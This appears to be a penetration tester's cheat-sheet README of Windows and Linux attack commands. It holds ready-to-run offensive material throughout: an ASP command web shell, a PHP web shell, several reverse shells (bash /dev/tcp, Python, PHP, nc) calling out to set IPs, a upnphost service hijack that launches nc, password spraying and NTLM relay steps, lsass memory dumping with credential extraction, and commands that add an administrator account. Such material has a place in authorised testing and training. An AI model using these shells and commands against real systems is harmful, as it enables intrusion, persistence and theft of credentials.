# This repository is a collection of tools and tricks to help you as test guide.


### If You Can't Set The Execution Policy Unrestricted to LocalMachine, You Need to Try It..
```powershell
PS C:\Users\c_sfi> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine       Undefined
 
 PS C:\Users\c_sfi> Set-ExecutionPolicy Unrestricted

Alteração da Política de Execução
A política de execução ajuda a proteger contra scripts não confiáveis. A alteração da política de execução pode
implicar exposição aos riscos de segurança descritos no tópico da ajuda about_Execution_Policies em
https://go.microsoft.com/fwlink/?LinkID=135170. Deseja alterar a política de execução?
[S] Sim  [A] Sim para Todos  [N] Não  [T] Não para Todos  [U] Suspender  [?] Ajuda (o padrão é "N"): S
Set-ExecutionPolicy : O acesso à chave do Registro
'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' foi negado. Para alterar a política
de execução para o escopo do padrão (LocalMachine), inicie o Windows PowerShell com a opção "Executar como
administrador".

PS C:\Users\c_sfi> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process

Alteração da Política de Execução
A política de execução ajuda a proteger contra scripts não confiáveis. A alteração da política de execução pode
implicar exposição aos riscos de segurança descritos no tópico da ajuda about_Execution_Policies em
https://go.microsoft.com/fwlink/?LinkID=135170. Deseja alterar a política de execução?
[S] Sim  [A] Sim para Todos  [N] Não  [T] Não para Todos  [U] Suspender  [?] Ajuda (o padrão é "N"): S

PS C:\Users\c_sfi> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process    Unrestricted
  CurrentUser       Undefined
 LocalMachine       Undefined
``` 
 It's valid to CurrentUser too.

### Converting Tab indented exploits to Space indented for Nano
```cmd
expand -4 exploit.py > new_exploit.py
```

### Windows XP SP1 - upnphost exploitation
#### NOTE: spaces are mandatory for this exploit to work !
```cmd
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

### ASP CMD Shell (IIS 5.1)
```cmd
<%

' ASP Cmd Shell On IIS 5.1
' brett.moore_at_security-assessment.com 
' http://seclists.org/bugtraq/2006/Dec/0226.html


Dim oS,oSNet,oFSys, oF,szCMD, szTF
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Set oSNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("C")
If (szCMD <> "") Then
  szTF = "c:\CHANGE\IT\" &  oFSys.GetTempName()
  ' Here we do the command
  Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF & """",0,True)
  response.write szTF
  ' Change perms
  Call oS.Run("win.com cmd.exe /c your-bin " & szTF & " /E /G everyone:F",0,True)
  Set oF = oFSys.OpenTextFile(szTF,1,False,0)
End If 
%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name="C" size=70 value="<%= szCMD %>">
<input type=submit value="Run"></FORM><PRE>
Machine: <%=oSNet.ComputerName%><BR>
Username: <%=oSNet.UserName%><br>
<% 
If (IsObject(oF)) Then
  On Error Resume Next
  Response.Write Server.HTMLEncode(oF.ReadAll)
  oF.Close
  Call oS.Run("win.com cmd.exe /c del "& szTF,0,True)
End If 

%>

<!--    http://michaeldaw.org   2006    -->
```

### SMB Share – SCF File Attacks
```bash
$ https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
```

### Nmap scripts searcher
```bash
> git clone https://github.com/sknux/pentest_scripts
> cd pentest_scripts
> chmod +x nmap_script_searcher.sh
> ./nmap_script_searcher.sh
```

### SCP Transfer File
```bash
> scp $1 $2 $3@$4:$5 //Transfer a file
> scp -r $1 $2 $3@$4:$5 //Transfer a entire path
```

### SSH Tunneling
```bash
> ssh user@remote_host -L 8080:specific_ip_address:3000
```

### Python Interactive SHELL
```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
```

### Simple Reverse SHELLs
```bash
> <?php system($_GET['cmd']);?> //PHPWebShell
> php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' //PHPReverseShell
> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
> nc 127.0.0.1 1337 -e /bin/bash
```

### CrackMapExec Utilities
```bash
> cme smb 172.0.5.0/24 //Enumeration
> cme smb 172.0.5.0/24 --gen-relay-list hosts.txt //Generate the targets apparently vulnerable to ntlmrelay attack
> cme smb 172.0.5.0/24 -u list.txt -p 'p@ssw0rd!!' //Password Spray
> cme smb 172.0.5.0/24 -u user -H 'hashnt:lm' --local-auth //ntlmhash reuse
> cme smb 172.0.5.0/24 -u user -H/-p 'hashnt:lm'/password --local-auth -x 'dir' //execute cmd.exe command
> cme smb 172.0.5.0/24 -u user -H/-p 'hashnt:lm'/password --local-auth --loggedon-users //identify users logged on the host
> cme smb 172.0.5.0/24 -u user -H/-p 'hashnt:lm'/password -M MODULE
```

### NTLM Relay Attack
```bash
=> In Responder.conf file, turn off the SMB and HTTP server.
> sudo responder -I eth0 -dwr
=> Execute the impacket-ntlmrelayx with the hosts obtained with the cme --gen-relay-list
> impacket-ntlmrelayx -tf hosts.txt -smb2support
=> And waiting for the interactions
```

### Some Executions of Procdump, PSExec and Net
```bash
=> Procdump:
> ./procdump64.exe -accepteula -ma lsass.exe local-dir (c://)
=> PSExec:
> ./psexec64.exe -s -i
=> Add a user to host
> net user USER PASSWORD /ADD
=> Add a user to group
> net localgroup administrators USER /ADD
```

### Pypykatz Utilities
```bash
=> Installation:
> pip3 install pypykatz
=> Procdump MiniDump:
> pypykatz lsa minidump file.dmp
```
### Linux Utilities
```bash
> msfconsole -q -x 'use $1; set RHOSTS $2;$3;exit'
> pspy64
> linpeas
```

### Windows Enumeration and Exploitation
```bash
> net user USER /domain
> Get-ADGroupMember -Identity 'Domain Admins/Enterprise Admins' -Recursive
=> Procdump MiniDump:
> pypykatz lsa minidump file.dmp
> \\live.sysinternals.com\tools\PsExec.exe -s -c cmd.exe
> net use z: https://live.sysinternals.com/tools && z:\PsExec.exe -s -c cmd.exe
> Get-Content C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
$ https://wadcoms.github.io/
$ https://github.com/besimorhino/powercat
$ https://twitter.com/cyb3rops/status/1448291042604863491
$ https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
```

### Web Enumeration and Exploitation
```bash
$ https://github.com/portswigger/saml-raider //SSO Pentest
$ https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696 //GraphQL Pentest
$ https://github.com/doyensec/inql#:~:text=InQL%20Burp%20Suite%20Extension%20Since%20version%201.0.0%20of,the%20inql%20extension%20for%20Burp%20Suite%2C%20you%20can%3A //GraphQL Pentest
> Know about introspection and the difference between queries and mutations //GraphQL Pentest
```
